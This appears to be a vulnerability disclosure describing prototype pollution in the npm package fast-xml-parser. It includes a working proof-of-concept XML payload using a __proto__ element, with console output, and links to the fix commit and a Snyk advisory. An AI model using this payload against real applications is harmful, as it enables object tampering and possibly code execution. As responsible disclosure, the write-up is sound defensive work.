I was auditing another application and found that they were using 
`fast-xml-parser` parse uploaded xml files.

The package description says *Validate XML, Parse XML to JS Object, or Build XML from JS Object without C/C++ based libraries and no callback.*

*Parse XML to JS Object* - this sounded very interesting and I knew I should test for prototype pollution as many other packages which *convert json to js objects* were found to be vulnerable in the past and it turned out yeah this package was vulnerable to it.

https://www.npmjs.com/package/fast-xml-parser
https://github.com/NaturalIntelligence/fast-xml-parser

Taking an example code from the github repo to demonstrate the bug:


```js
const { XMLParser, XMLBuilder, XMLValidator} = require("fast-xml-parser");


let XMLdata = "<__proto__><polluted>hacked</polluted></__proto__>"

const parser = new XMLParser();
let jObj = parser.parse(XMLdata);


console.log(jObj.polluted) // should return hacked
```

![Code_G3UvvJcSv5](https://user-images.githubusercontent.com/31372554/218308540-86792929-3631-4580-8373-4651487418b5.png)

In the above screenshot you can see the `jObj` was polluted with a new property.

```js
jObj
>{}
jObj.__proto__
>{polluted: 'hacked'}
jObj.__proto__.polluted
>'hacked'
```

More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/

As it is common for developers to pass user controllable input to `XMLParser` , this can to do unexpected results. By chaining it with some prototype pollution gadget it might even can lead to RCE in some cases https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/


Fix commit: https://github.com/NaturalIntelligence/fast-xml-parser/commit/2b032a4f799c63d83991e4f992f1c68e4dd05804

They are now validating, if the key contains `__proto__` and replaces it with `#__proto__`

CVE is still pending 

The package maintainer @amitguptagwl was very swift in replies and addressing the reported issue :)


SNYK Advisory: https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-3325616
